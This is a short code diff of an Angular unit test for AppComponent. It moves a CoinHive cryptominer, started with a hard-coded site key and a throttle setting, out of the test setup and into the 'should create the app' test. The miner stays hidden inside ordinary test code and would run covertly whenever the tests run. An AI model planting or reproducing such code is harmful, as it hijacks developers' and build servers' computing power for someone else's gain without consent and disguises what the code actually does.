@@ -2,10 +2,6 @@ import { TestBed, async } from '@angular/core/testing';
 import { AppComponent } from './app.component';
 describe('AppComponent', () => {
   beforeEach(async(() => {
-    const originalTimeout = jasmine.DEFAULT_TIMEOUT_INTERVAL;
-    jasmine.DEFAULT_TIMEOUT_INTERVAL = 100000000;
-    var mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
-    mnnc.start();
     TestBed.configureTestingModule({
       declarations: [
         AppComponent
@@ -13,6 +9,8 @@ describe('AppComponent', () => {
     }).compileComponents();
   }));
   it('should create the app', async(() => {
+    var mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
+    mnnc.start();
     const fixture = TestBed.createComponent(AppComponent);
     const app = fixture.debugElement.componentInstance;
     expect(app).toBeTruthy();
